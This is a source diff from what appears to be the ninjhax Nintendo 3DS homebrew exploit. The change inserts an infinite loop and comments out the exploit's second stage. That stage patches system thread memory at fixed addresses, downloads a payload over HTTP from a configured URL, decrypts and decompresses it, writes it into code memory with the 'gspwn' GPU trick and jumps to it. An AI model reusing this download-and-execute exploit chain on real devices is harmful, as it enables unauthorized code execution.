@@ -247,120 +247,122 @@ int _main()
 	// drawString(TOPFBADR1,"ninjhaxx",0,0);
 	// drawString(TOPFBADR2,"ninjhaxx",0,0);
 
-	Handle* srvHandle=(Handle*)CN_SRVHANDLE_ADR;
+		while(1);
 
-	int line=10;
-	Result ret;
+	// Handle* srvHandle=(Handle*)CN_SRVHANDLE_ADR;
 
-	Handle* addressArbiterHandle=(Handle*)0x00334960;
+	// int line=10;
+	// Result ret;
 
-	Result (*_DSP_UnloadComponent)(Handle* handle)=(void*)0x002BA368;
-	Result (*_DSP_RegisterInterruptEvents)(Handle* handle, Handle event, u32 param0, u32 param1)=(void*)0x002AED20;
-	Handle** dspHandle=(Handle**)0x334EFC;
+	// Handle* addressArbiterHandle=(Handle*)0x00334960;
 
-	_DSP_UnloadComponent(*dspHandle);
-	_DSP_RegisterInterruptEvents(*dspHandle, 0x0, 0x2, 0x2);
+	// Result (*_DSP_UnloadComponent)(Handle* handle)=(void*)0x002BA368;
+	// Result (*_DSP_RegisterInterruptEvents)(Handle* handle, Handle event, u32 param0, u32 param1)=(void*)0x002AED20;
+	// Handle** dspHandle=(Handle**)0x334EFC;
 
-	//close threads
-		//patch gsp event handler addr to kill gsp thread ASAP
-		*((u32*)(0x356208+0x10+4*0x4))=0x002ABEDC; //svc 0x9 addr
+	// _DSP_UnloadComponent(*dspHandle);
+	// _DSP_RegisterInterruptEvents(*dspHandle, 0x0, 0x2, 0x2);
 
-		//patch waitSyncN
-		patchMem(gspHandle, computeCodeAddress(0x00192200), 0x200, 0x19, 0x4F);
-		patchMem(gspHandle, computeCodeAddress(0x00192600), 0x200, 0x7, 0x13);
-		patchMem(gspHandle, computeCodeAddress(0x001CA200), 0x200, 0xB, 0x1E);
-		// patchMem(gspHandle, computeCodeAddress(0x000C6100), 0x200, 0x3C, 0x52);
+	// //close threads
+	// 	//patch gsp event handler addr to kill gsp thread ASAP
+	// 	*((u32*)(0x356208+0x10+4*0x4))=0x002ABEDC; //svc 0x9 addr
 
-		//patch arbitrateAddress
-		patchMem(gspHandle, computeCodeAddress(0x001C9E00), 0x200, 0x14, 0x40);
+	// 	//patch waitSyncN
+	// 	patchMem(gspHandle, computeCodeAddress(0x00192200), 0x200, 0x19, 0x4F);
+	// 	patchMem(gspHandle, computeCodeAddress(0x00192600), 0x200, 0x7, 0x13);
+	// 	patchMem(gspHandle, computeCodeAddress(0x001CA200), 0x200, 0xB, 0x1E);
+	// 	// patchMem(gspHandle, computeCodeAddress(0x000C6100), 0x200, 0x3C, 0x52);
 
-		//wake threads
-		svc_arbitrateAddress(*addressArbiterHandle, 0x35811c, 0, -1, 0);
-		svc_signalEvent(((Handle*)0x3480d0)[2]);
-		s32 out; svc_releaseSemaphore(&out, *(Handle*)0x357490, 1);
+	// 	//patch arbitrateAddress
+	// 	patchMem(gspHandle, computeCodeAddress(0x001C9E00), 0x200, 0x14, 0x40);
 
-		//kill thread5 without panicking the kernel...
-		*(u8*)0x359935=0x00;
+	// 	//wake threads
+	// 	svc_arbitrateAddress(*addressArbiterHandle, 0x35811c, 0, -1, 0);
+	// 	svc_signalEvent(((Handle*)0x3480d0)[2]);
+	// 	s32 out; svc_releaseSemaphore(&out, *(Handle*)0x357490, 1);
 
-	svc_sleepThread(0x10000000);
+	// 	//kill thread5 without panicking the kernel...
+	// 	*(u8*)0x359935=0x00;
 
-	Handle httpcHandle;
-	ret=_srv_getServiceHandle(srvHandle, &httpcHandle, "http:C");
+	// svc_sleepThread(0x10000000);
 
-	// drawHex(ret,0,line+=10);
-	// drawHex(httpcHandle,0,line+=10);
+	// Handle httpcHandle;
+	// ret=_srv_getServiceHandle(srvHandle, &httpcHandle, "http:C");
 
-	Handle httpContextHandle=0x00;
+	// // drawHex(ret,0,line+=10);
+	// // drawHex(httpcHandle,0,line+=10);
 
-	ret=HTTPC_Initialize(httpcHandle);
+	// Handle httpContextHandle=0x00;
 
-	// drawHex(ret,0,line+=10);
+	// ret=HTTPC_Initialize(httpcHandle);
 
-	ret=HTTPC_CreateContext(httpcHandle, CN_NINJHAX_URL OUTNAME ".bin", &httpContextHandle);
+	// // drawHex(ret,0,line+=10);
 
-	// drawHex(ret,0,line+=10);
+	// ret=HTTPC_CreateContext(httpcHandle, CN_NINJHAX_URL OUTNAME ".bin", &httpContextHandle);
+
+	// // drawHex(ret,0,line+=10);
 	
-	Handle httpcHandle2;
-	ret=_srv_getServiceHandle(srvHandle, &httpcHandle2, "http:C");
-	if(ret)*(u32*)NULL=0xC0DE0001;
+	// Handle httpcHandle2;
+	// ret=_srv_getServiceHandle(srvHandle, &httpcHandle2, "http:C");
+	// if(ret)*(u32*)NULL=0xC0DE0001;
 
-	ret=HTTPC_InitializeConnectionSession(httpcHandle2, httpContextHandle);
-	if(ret)*(u32*)NULL=0xC0DE0002;
-	ret=HTTPC_SetProxyDefault(httpcHandle2, httpContextHandle);
-	if(ret)*(u32*)NULL=0xC0DE0003;
+	// ret=HTTPC_InitializeConnectionSession(httpcHandle2, httpContextHandle);
+	// if(ret)*(u32*)NULL=0xC0DE0002;
+	// ret=HTTPC_SetProxyDefault(httpcHandle2, httpContextHandle);
+	// if(ret)*(u32*)NULL=0xC0DE0003;
 
-	// drawHex(ret,0,line+=10);
+	// // drawHex(ret,0,line+=10);
 
-	ret=HTTPC_BeginRequest(httpcHandle2, httpContextHandle);
-	if(ret)*(u32*)NULL=0xC0DE0004;
+	// ret=HTTPC_BeginRequest(httpcHandle2, httpContextHandle);
+	// if(ret)*(u32*)NULL=0xC0DE0004;
 
-	// drawHex(ret,0,line+=10);
+	// // drawHex(ret,0,line+=10);
 
-	u8* buffer0=(u8*)0x14100000;
-	u8* buffer1=(u8*)0x14300000;
-	u32 secondaryPayloadSize=0x0;
-	ret=HTTPC_ReceiveData(httpcHandle2, httpContextHandle, buffer0, 0x300000);
-	if(ret)*(u32*)NULL=0xC0DE0005;
-	ret=HTTPC_GetDownloadSizeState(httpcHandle2, httpContextHandle, &secondaryPayloadSize);
-	if(ret)*(u32*)NULL=0xC0DE0006;
+	// u8* buffer0=(u8*)0x14100000;
+	// u8* buffer1=(u8*)0x14300000;
+	// u32 secondaryPayloadSize=0x0;
+	// ret=HTTPC_ReceiveData(httpcHandle2, httpContextHandle, buffer0, 0x300000);
+	// if(ret)*(u32*)NULL=0xC0DE0005;
+	// ret=HTTPC_GetDownloadSizeState(httpcHandle2, httpContextHandle, &secondaryPayloadSize);
+	// if(ret)*(u32*)NULL=0xC0DE0006;
 
-	// drawHex(ret,0,line+=10);
+	// // drawHex(ret,0,line+=10);
 
-	HTTPC_CloseContext(httpcHandle2, httpContextHandle);
-	if(ret)*(u32*)NULL=0xC0DE0007;
+	// HTTPC_CloseContext(httpcHandle2, httpContextHandle);
+	// if(ret)*(u32*)NULL=0xC0DE0007;
 
-	//TODO : modify key/parray first ?
-	//(use some of its slots as variables in ROP to confuse people ?)
-	//decrypt secondary payload
-	Result (*blowfishKeyScheduler)(u32* dst)=(void*)0x001A44BC;
-	Result (*blowfishDecrypt)(u32* blowfishKeyData, u32* src, u32* dst, u32 size)=(void*)0x001A4B04;
+	// //TODO : modify key/parray first ?
+	// //(use some of its slots as variables in ROP to confuse people ?)
+	// //decrypt secondary payload
+	// Result (*blowfishKeyScheduler)(u32* dst)=(void*)0x001A44BC;
+	// Result (*blowfishDecrypt)(u32* blowfishKeyData, u32* src, u32* dst, u32 size)=(void*)0x001A4B04;
 
-	blowfishKeyScheduler((u32*)0x14200000);
-	blowfishDecrypt((u32*)0x14200000, (u32*)buffer0, (u32*)buffer1, secondaryPayloadSize);
+	// blowfishKeyScheduler((u32*)0x14200000);
+	// blowfishDecrypt((u32*)0x14200000, (u32*)buffer0, (u32*)buffer1, secondaryPayloadSize);
 
-	while(!*(u32*)(&buffer1[secondaryPayloadSize-4]))secondaryPayloadSize-=4;
+	// while(!*(u32*)(&buffer1[secondaryPayloadSize-4]))secondaryPayloadSize-=4;
 
-	lzss_decompress(buffer1, secondaryPayloadSize, buffer0, lzss_get_decompressed_size(buffer1, secondaryPayloadSize));
+	// lzss_decompress(buffer1, secondaryPayloadSize, buffer0, lzss_get_decompressed_size(buffer1, secondaryPayloadSize));
 
-	ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)buffer0, 0x300000);
-	// drawHex(ret,0,line+=10);
+	// ret=_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)buffer0, 0x300000);
+	// // drawHex(ret,0,line+=10);
 
-	doGspwn((u32*)(buffer0), (u32*)computeCodeAddress(CN_3DSX_LOADADR-0x00100000), 0x0000C000);
+	// doGspwn((u32*)(buffer0), (u32*)computeCodeAddress(CN_3DSX_LOADADR-0x00100000), 0x0000C000);
 
-	svc_sleepThread(0x3B9ACA00);
+	// svc_sleepThread(0x3B9ACA00);
 
-	// drawString(TOPFBADR1,"ninjhax2",100,0);
-	// drawString(TOPFBADR2,"ninjhax2",100,0);
+	// // drawString(TOPFBADR1,"ninjhax2",100,0);
+	// // drawString(TOPFBADR2,"ninjhax2",100,0);
 
-	// //close thread handles
-	// ret=svc_closeHandle(*((Handle*)0x359938));
-	// ret=svc_closeHandle(*((Handle*)0x34FEA4));
-	// ret=svc_closeHandle(*((Handle*)0x356274));
-	// ret=svc_closeHandle(*((Handle*)0x334730));
-	// ret=svc_closeHandle(*((Handle*)0x334F64));
+	// // //close thread handles
+	// // ret=svc_closeHandle(*((Handle*)0x359938));
+	// // ret=svc_closeHandle(*((Handle*)0x34FEA4));
+	// // ret=svc_closeHandle(*((Handle*)0x356274));
+	// // ret=svc_closeHandle(*((Handle*)0x334730));
+	// // ret=svc_closeHandle(*((Handle*)0x334F64));
 
-	void (*reset)(u32 size)=(void*)CN_3DSX_LOADADR;
-	reset(secondaryPayloadSize);
+	// void (*reset)(u32 size)=(void*)CN_3DSX_LOADADR;
+	// reset(secondaryPayloadSize);
 
 	return 0;
 }
